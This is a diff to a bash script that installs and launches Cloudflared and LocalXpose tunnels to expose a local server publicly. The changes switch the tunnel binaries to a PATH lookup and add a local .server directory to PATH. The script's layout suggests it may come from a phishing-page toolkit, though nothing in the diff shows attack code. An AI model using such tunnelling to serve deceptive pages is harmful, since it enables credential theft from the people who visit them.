@@ -106,6 +106,8 @@ RESETBG="$(printf '\e[0m\n')"
 ## Directories
 BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
 
+[[ -d .server ]] && PATH="$(pwd)/.server:${PATH}"
+
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
 fi
@@ -302,7 +304,7 @@ download() {
 
 ## Install Cloudflared
 install_cloudflared() {
-	if [[ -e ".server/cloudflared" ]]; then
+	if command -v cloudflared >/dev/null; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
 	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
@@ -321,7 +323,7 @@ install_cloudflared() {
 
 ## Install LocalXpose
 install_localxpose() {
-	if [[ -e ".server/loclx" ]]; then
+	if command -v loclx >/dev/null; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
 	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
@@ -460,7 +462,7 @@ start_cloudflared() {
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	else
-		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	fi
 
 	sleep 8
@@ -470,11 +472,11 @@ start_cloudflared() {
 }
 
 localxpose_auth() {
-	./.server/loclx -help > /dev/null 2>&1 &
+	loclx -help > /dev/null 2>&1 &
 	sleep 1
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
 
-	[ "$(./.server/loclx account status | grep Error)" ] && {
+	[ "$(loclx account status | grep Error)" ] && {
 		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
 		sleep 3
 		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
@@ -499,7 +501,7 @@ start_loclx() {
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
 	else
-		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+		sleep 1 && loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
 	fi
 
 	sleep 12
